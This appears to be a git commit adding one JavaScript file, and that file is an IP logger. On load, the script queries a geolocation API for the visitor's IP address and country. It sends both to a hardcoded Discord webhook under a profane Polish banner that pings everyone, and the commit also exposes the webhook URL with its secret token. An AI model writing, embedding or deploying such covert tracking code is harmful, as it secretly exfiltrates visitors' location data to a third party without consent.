78191447a8f32ff9149616782ba3b7c03ab8ca67
Sparky609 <88623465+Sparky609@users.noreply.github.com>
2022-08-30 22:24:17 +0200

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,42 @@
+var webHookUrl =
+  "https://discord.com/api/webhooks/844922214792560670/KHIzj0UB-HEZJSSFVWUZX3sWH6xYUHEjNd9ajHsDrpBRs9kTPJNs6R4KOGRbT7E8pMAZ";
+
+$.getJSON("https://api.db-ip.com/v2/free/self", function (data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => {
+  // Calling a "synchronous" fetch
+  const response = await fetch("https://api.db-ip.com/v2/free/self");
+  const data = await response.json();
+  console.log(data);
+
+  // Declaring variables
+  var ip = data.ipAddress;
+  var country = data.countryName;
+
+  // Open POST Request
+  var postRequest = new XMLHttpRequest();
+  postRequest.open("POST", webHookUrl);
+
+  postRequest.setRequestHeader("Content-type", "application/json");
+
+  var params = {
+    username: "IP Log",
+    avatar_url: "",
+    content:
+      "**NOWA KURWA IP BOMBA** @everyone \n" +
+      "__**:globe_with_meridians: IP Address:**__ \n" +
+      "`" +
+      ip +
+      "` \n \n" +
+      "__**Country:**__ \n" +
+      "`" +
+      country +
+      "`",
+  };
+
+  postRequest.send(JSON.stringify(params));
+};
+
+request();
